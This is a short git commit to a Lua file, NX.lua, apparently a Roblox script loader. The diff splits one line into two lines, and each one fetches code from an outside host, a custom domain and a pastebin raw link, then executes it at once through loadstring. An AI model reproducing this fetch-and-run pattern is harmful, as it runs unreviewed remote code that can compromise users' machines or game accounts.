8fb3edf24696ec7957993f0ad83386a37c88180c
NXREBORN <oy70204@gmail.com>
2024-12-16 05:56:48 +0800

    Update NX.lua

--- NX.lua
+++ NX.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://egorikusa.space/fbff248039b71c593636e643.lua", true))() loadstring(game:HttpGet("https://pastebin.com/raw/e2AuSdqU"))()
+loadstring(game:HttpGet("https://egorikusa.space/fbff248039b71c593636e643.lua", true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/e2AuSdqU"))()
